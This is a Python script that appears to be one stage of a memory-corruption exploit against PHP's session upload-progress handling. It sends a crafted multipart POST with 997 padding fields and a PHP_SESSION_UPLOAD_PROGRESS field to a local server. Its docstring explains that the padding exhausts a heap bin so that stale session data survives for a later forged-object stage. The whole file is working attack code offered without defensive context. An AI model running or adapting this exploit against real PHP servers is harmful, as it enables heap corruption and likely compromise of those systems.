#!/usr/bin/env python3
"""B0: safely close the A's stale session data and then OOM at reset so the
A's PS(id) (chunk+0x6f080) and send_cookie=1 survive for the fake B.
No file part (do not overwrite PS(id)); 997 103-byte fields fill the 128B bin
so the reset's 128B e_id allocation fails.
usage: b0_fill.py [PATH]
"""
import socket,sys
PATH=sys.argv[1] if len(sys.argv)>1 else '/plain.php'
BND=b'B'*10
o=bytearray()
for i in range(997):
    o+=b'--'+BND+b'\r\nContent-Disposition: form-data; name="f%04d"\r\n\r\n'%i + b'A'*103 + b'\r\n'
o+=b'--'+BND+b'\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\npwn\r\n'
o+=b'--'+BND+b'--\r\n'
req=(f'POST {PATH} HTTP/1.1\r\nHost: 127.0.0.1:8088\r\nCookie: PHPSESSID=attacksessionid0001\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(o)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection(('127.0.0.1',8088),timeout=20); s.settimeout(20)
data=b''
try:
    s.sendall(req+bytes(o))
    while len(data)<200000:
        c=s.recv(65536)
        if not c: break
        data+=c
except OSError as e: print('recv_err',repr(e))
s.close()
open('/tmp/b0_fill.resp','wb').write(data)
head,_,rest=data.partition(b'\r\n\r\n')
print('RESP_LEN',len(data))
for line in head.split(b'\r\n'):
    if line.lower().startswith(b'set-cookie'):
        print('SETCOOKIE',line[:100].decode('latin1','replace'))
print('BODY',rest[:60].decode('latin1','replace'))
